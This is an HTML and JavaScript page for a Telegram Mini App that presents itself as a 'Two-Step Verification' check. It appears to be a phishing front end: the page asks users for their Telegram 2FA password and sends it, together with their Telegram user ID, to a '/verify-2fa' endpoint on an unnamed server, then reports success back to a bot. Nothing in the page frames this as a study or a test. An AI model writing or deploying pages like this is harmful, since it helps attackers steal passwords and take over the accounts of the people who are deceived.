<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2FA Verification</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <video class="background-video" autoplay muted loop playsinline>
            <source src="video/video2.mp4" type="video/mp4">
        </video>

        <div class="content">
            <div class="emoji-center">
                <span class="emoji">🔐</span>
            </div>

            <div class="instruction">
                <b>Two-Step Verification</b><br><br>
                Enter your 2FA password to continue.
            </div>

            <input type="password" id="twofa-input" placeholder="Enter password">

            <button id="twofa-btn" class="verify-btn">✅ Verify 2FA</button>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const tg = window.Telegram.WebApp;
            const twofaInput = document.getElementById('twofa-input');
            const twofaBtn = document.getElementById('twofa-btn');

            const SERVER_URL = '';
            const userId = tg.initDataUnsafe?.user?.id || 'user_default';

            tg.ready();
            tg.expand();

            twofaBtn.addEventListener('click', async function () {
                const password = twofaInput.value;
                if (!password) {
                    alert('Please enter your 2FA password!');
                    return;
                }

                twofaBtn.disabled = true;
                twofaBtn.textContent = 'Verifying...';

                try {
                    const res = await fetch(`${SERVER_URL}/verify-2fa`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ password, user_id: String(userId) })
                    });

                    const result = await res.json();

                    if (result.success) {
                        tg.sendData('verified:2fa_success');
                    } else {
                        alert(result.message || 'Incorrect 2FA password.');
                    }
                } catch (err) {
                    alert('Error: ' + err.message);
                } finally {
                    twofaBtn.disabled = false;
                    twofaBtn.textContent = '✅ Verify 2FA';
                }
            });
        });
    </script>
</body>
</html>
